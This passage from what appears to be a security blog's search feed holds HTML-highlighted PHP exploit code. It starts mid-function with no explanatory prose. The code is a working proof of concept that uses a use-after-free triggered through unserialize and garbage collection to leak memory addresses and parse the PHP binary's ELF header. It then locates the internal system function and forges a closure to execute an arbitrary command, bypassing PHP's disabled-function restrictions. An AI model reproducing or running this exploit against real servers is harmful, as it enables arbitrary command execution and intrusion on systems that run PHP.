class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$text_size</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$text_size</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ryat</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$chtg</span>;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;chtg = <span class="hljs-variable language_">$this</span>-&gt;ryat;<br>            <span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>);<br><br>    <span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><br>    <span class="hljs-variable">$v</span> = [];<br>    <span class="hljs-variable">$v</span>[<span class="hljs-number">0</span>] = <span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$v</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$out</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
